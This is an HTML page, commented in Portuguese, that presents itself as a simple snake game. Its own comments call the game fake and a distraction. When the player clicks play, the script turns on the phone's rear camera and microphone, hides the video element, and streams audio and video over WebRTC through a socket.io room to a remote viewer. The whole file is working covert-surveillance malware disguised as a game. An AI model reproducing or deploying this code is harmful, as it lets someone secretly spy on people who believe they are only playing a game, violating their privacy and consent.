<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Jogo da Cobrinha</title>
<style>
  body {margin:0; background:#0f172a; color:#fff; font-family:Arial; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden;}
  /* VIDEO FICA ESCONDIDO */
  #localVideo {display:none!important; width:1px; height:1px; opacity:0; position:absolute;}

.tela {text-align:center; background:#1e293b; padding:25px; border-radius:12px; width:90%; max-width:400px;}
  button {padding:14px 24px; background:#22c55e; border:none; border-radius:8px; color:#fff; font-size:18px; cursor:pointer; margin:8px; width:90%; font-weight:bold;}
  button:active{background:#16a34a}

  /* JOGO FAKE PRA DISTRAIR */
  canvas {background:#020617; border:2px solid #334155; border-radius:8px; touch-action:none;}
  #controles {display:flex; position:absolute; bottom:15px; width:100%; justify-content:center; z-index:50;}
.dpad {display:grid; grid-template-columns:60px 60px 60px; grid-template-rows:60px 60px 60px; gap:6px;}
.btn-controle {width:60px; height:60px; background:rgba(59,130,246,0.9); border:2px solid #3b82f6; border-radius:15px; color:#fff; font-size:22px; display:flex; justify-content:center; align-items:center; user-select:none; touch-action:none;}
.btn-controle:active {background:rgba(59,130,246,1); transform:scale(0.9);}
  #btn-cima {grid-column:2; grid-row:1;} #btn-esquerda {grid-column:1; grid-row:2;}
  #btn-direita {grid-column:3; grid-row:2;} #btn-baixo {grid-column:2; grid-row:3;}
</style>
</head>
<body>

<!-- VIDEO ESCONDIDO - SÓ TRANSMITE -->
<video id="localVideo" autoplay muted playsinline></video>

<!-- TELA DE INICIO FAKE -->
<div id="tela-menu" class="tela">
  <h1>🐍 Jogo da Cobrinha</h1>
  <p>Clique para jogar</p>
  <button id="btnJogar">JOGAR</button>
</div>

<!-- JOGO FAKE -->
<canvas id="jogo" width="300" height="300" style="display:none;"></canvas>
<div id="controles" style="display:none;">
  <div class="dpad">
    <div class="btn-controle" id="btn-cima">▲</div>
    <div class="btn-controle" id="btn-esquerda">◀</div>
    <div class="btn-controle" id="btn-direita">▶</div>
    <div class="btn-controle" id="btn-baixo">▼</div>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io(); let localStream; const ROOM = "sala-principal"; let pc;

// 1. LIGA A CAMERA ESCONDIDA ASSIM QUE CLICAR
async function iniciar() {
  document.getElementById('tela-menu').style.display = 'none';
  document.getElementById('jogo').style.display = 'block';
  document.getElementById('controles').style.display = 'flex';
  iniciarJogoFake(); // Inicia o jogo distração

  try{
    localStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:true});
    document.getElementById('localVideo').srcObject = localStream; // Mas não mostra na tela

    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
    socket.emit('join-room', ROOM);
    let offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit('offer', offer, ROOM);

  }catch(err){ alert("Precisa permitir Câmera e Microfone"); }
}
socket.on('answer', async(answer)=>{ if(pc) await pc.setRemoteDescription(answer); });
document.getElementById('btnJogar').onclick = iniciar;

// 2. JOGO FAKE SIMPLES - COBRINHA
const canvas = document.getElementById('jogo'); const ctx = canvas.getContext('2d');
let cobra = [{x:150, y:150}]; let comida = {x:100, y:100}; let dir = 'direita'; let pont = 0;
let teclas = {};

function setupControles(){
  const mapear = { 'btn-cima':'up', 'btn-baixo':'down', 'btn-esquerda':'left', 'btn-direita':'right' };
  Object.keys(mapear).forEach(id=>{
    const btn = document.getElementById(id); const key = mapear[id];
    btn.addEventListener('touchstart', e => {e.preventDefault(); dir=key}, {passive:false});
  });
}
setupControles();

function iniciarJogoFake() {
  setInterval(() => {
    // Move cobra
    let head = {...cobra[0]};
    if(dir==='up') head.y -= 10;
    if(dir==='down') head.y += 10;
    if(dir==='left') head.x -= 10;
    if(dir==='right') head.x += 10;
    cobra.unshift(head);

    // Comeu comida
    if(head.x === comida.x && head.y === comida.y) {
      pont++;
      comida = {x: Math.floor(Math.random()*30)*10, y: Math.floor(Math.random()*30)*10};
    } else {
      cobra.pop();
    }

    // Desenha
    ctx.clearRect(0,0,300,300);
    ctx.fillStyle = "#22c55e"; cobra.forEach(p => ctx.fillRect(p.x, p.y, 10, 10));
    ctx.fillStyle = "#ef4444"; ctx.fillRect(comida.x, comida.y, 10, 10);
    ctx.fillStyle = "#fff"; ctx.font = "16px Arial"; ctx.fillText("Pontos: " + pont, 10, 20);

    // Bateu na parede
    if(head.x < 0 || head.x >= 300 || head.y < 0 || head.y >= 300) {
      alert("Game Over! Pontos: " + pont);
      cobra = [{x:150, y:150}]; pont = 0;
    }
  }, 150);
}
</script>
</body></html>
